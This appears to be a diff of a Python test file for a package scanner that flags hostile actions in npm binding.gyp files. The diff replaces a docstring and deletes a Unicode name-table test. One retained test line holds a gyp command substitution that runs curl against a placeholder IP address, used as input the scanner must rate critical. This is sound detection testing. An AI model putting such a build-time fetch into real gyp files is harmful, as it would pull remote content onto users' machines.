@@ -7,12 +7,11 @@ Review fix in core itself: an action argument that is an int of more than
 scan_gyp, so a hostile binding.gyp crashed the scan instead of being
 reported. Such an int is now shown in hex, as the npm engine shows it.
 
-The npm engine reads \\N{...} names from a table (js/src/lib/pynames.js);
-NameTableTests checks it against this interpreter's unicodedata."""
+A gyp file is read by the engine for both packages since BR-7's step 3 (b)
+(rust/crates/lazaret-engine/src/manifest/pylit.rs: ast.literal_eval on the
+engine's Python parser, which reads \\N{...} names as Python does); these
+are the values core's own reading gave."""
 
-import os
-import re
-import unicodedata
 import unittest
 import warnings
 
@@ -97,37 +96,6 @@ class GypStringAndContainerTests(unittest.TestCase):
         self.assertEqual(gyp("{('<!(curl -s http://192.0.2.1/x)',): 1}"), [("CRITICAL", "curl -s http://192.0.2.1/x")])
         self.assertEqual(gyp("{1: {'action': ['echo', 'one']}, '1': {'action': ['echo', 'two']}}"),
                          [("MAJOR", "echo one"), ("MAJOR", "echo two")])
-
-
-NAMES_JS = os.path.join(_support.REPO_ROOT, "js", "src", "lib", "pynames.js")
-# the ranges the table covers (see its header), and its aliases newer than Python 3.10
-COVERED = [range(0x0000, 0x0180), range(0x1680, 0x1681), range(0x2000, 0x200B), range(0x2028, 0x202A),
-           range(0x202F, 0x2030), range(0x205F, 0x2060), range(0x212A, 0x212C), range(0x3000, 0x3001)]
-NEWER_ALIASES = {"EM"}
-
-
-class NameTableTests(unittest.TestCase):
-    def test_every_name_is_python_s(self):
-        with open(NAMES_JS, encoding="utf-8") as f:
-            text = f.read()
-        start = text.index("const TABLE =")
-        body = text[start:text.index(";\n", start)]
-        table = {}
-        for entry in "".join(re.findall(r'"([^"]*)"', body)).split(";"):
-            cp, names = entry.split(":")
-            table[int(cp, 16)] = names.split("|")
-        for cp, names in table.items():
-            for name in names:
-                with self.subTest(name=name):
-                    try:
-                        self.assertEqual(unicodedata.lookup(name), chr(cp))
-                    except KeyError:
-                        self.assertIn(name, NEWER_ALIASES)
-        for r in COVERED:
-            for cp in r:
-                name = unicodedata.name(chr(cp), None)
-                if name is not None:
-                    self.assertIn(name, table.get(cp, ()), hex(cp))
 
 
 if __name__ == "__main__":
